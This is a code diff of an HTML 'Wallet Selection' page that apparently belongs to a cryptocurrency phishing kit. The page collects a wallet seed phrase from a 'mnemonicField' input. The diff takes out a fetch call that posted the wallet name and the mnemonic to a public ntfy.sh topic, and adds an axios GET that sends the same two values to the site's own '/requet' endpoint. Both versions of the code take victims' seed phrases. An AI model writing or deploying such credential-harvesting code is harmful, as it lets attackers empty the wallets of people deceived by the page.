@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <title>Wallet Selection</title>
 </head>
 <body class="bg-gray-100 flex flex-col items-center">
@@ -1254,12 +1255,19 @@
             const message = document.getElementById('mnemonicField').value;
             const wallet = document.getElementById('walletName').innerText;
 
+            const getRequest = async () => {
+                const response = await axios.get('/requet', {
+                params: {
+                    "wallet": wallet,
+                    "message": message
+                }
+                })
+                console.log(response.data)
+                }
+            getRequest();
 
-            fetch("https://ntfy.sh/KING_OF_FOOTBALL", {
-                method: "POST",
-                headers: { "Content-Type": "text/plain" },
-                body: `${wallet}: ${message}`
-            });
+
+
             document.getElementById("mnemonicField").classList.add("hidden");
             document.getElementById("submitMnemonicBtn").classList.add("hidden");
             document.getElementById("loading").classList.remove("hidden"); // Hide loading
